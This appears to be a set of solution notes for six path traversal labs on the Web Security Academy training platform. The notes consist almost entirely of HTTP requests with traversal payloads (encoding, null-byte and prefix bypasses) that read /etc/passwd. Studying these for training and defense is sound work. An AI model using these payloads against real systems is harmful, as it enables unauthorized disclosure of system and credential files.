## Lab - 1: File path traversal, simple case

```
GET /image?filename=../../../etc/passwd HTTP/1.1
...
Referer: https://0ab800f904abed05c02be352002e0049.web-security-academy.net/product?productId=1
...
```

---

## Lab - 2: File path traversal, traversal sequences blocked with absolute path bypass

```
GET /image?filename=/etc/passwd HTTP/1.1
...
Referer: https://0ab800f904abed05c02be352002e0049.web-security-academy.net/product?productId=1
...
```

---

## Lab - 3: File path traversal, traversal sequences stripped non-recursively

```
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
...
Referer: https://0ab800f904abed05c02be352002e0049.web-security-academy.net/product?productId=1
...
```

---

## Lab - 4: File path traversal, traversal sequences stripped with superfluous URL-decode

```
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
...
Referer: https://0ab800f904abed05c02be352002e0049.web-security-academy.net/product?productId=1
...
```

---

## Lab - 5: File path traversal, validation of start of path

```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
...
Referer: https://0ab800f904abed05c02be352002e0049.web-security-academy.net/product?productId=1
...
```

## Lab - 6: File path traversal, validation of file extension with null byte bypass

```
GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
...
Referer: https://0ab800f904abed05c02be352002e0049.web-security-academy.net/product?productId=1
...
```
